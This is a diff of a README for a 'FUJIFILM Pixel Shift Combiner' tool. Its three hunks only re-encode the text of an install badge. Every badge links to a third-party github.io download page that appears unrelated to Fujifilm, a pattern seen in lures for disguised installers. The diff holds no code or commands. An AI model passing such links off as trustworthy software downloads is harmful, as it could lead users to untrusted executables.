@@ -22,7 +22,7 @@
 
 <div align="center">
 
-[![⬇ Install FUJIFILM Pixel Shift Combiner](https://img.shields.io/badge/⬇_Install_FUJIFILM%20Pixel%20Shift%20Combiner-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install FUJIFILM Pixel Shift Combiner](https://img.shields.io/badge/⬇_Install_FUJIFILM+Pixel+Shift+Combiner-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
@@ -81,7 +81,7 @@ FUJIFILM Pixel Shift Combiner is a free desktop utility for combining multi-shot
 
 <div align="center">
 
-[![⬇ Install FUJIFILM Pixel Shift Combiner](https://img.shields.io/badge/⬇_Install_FUJIFILM%20Pixel%20Shift%20Combiner-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install FUJIFILM Pixel Shift Combiner](https://img.shields.io/badge/⬇_Install_FUJIFILM+Pixel+Shift+Combiner-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
@@ -125,7 +125,7 @@ FUJIFILM Pixel Shift Combiner is a free desktop utility for combining multi-shot
 
 <div align="center">
 
-[![⬇ Install FUJIFILM Pixel Shift Combiner](https://img.shields.io/badge/⬇_Install_FUJIFILM%20Pixel%20Shift%20Combiner-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install FUJIFILM Pixel Shift Combiner](https://img.shields.io/badge/⬇_Install_FUJIFILM+Pixel+Shift+Combiner-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
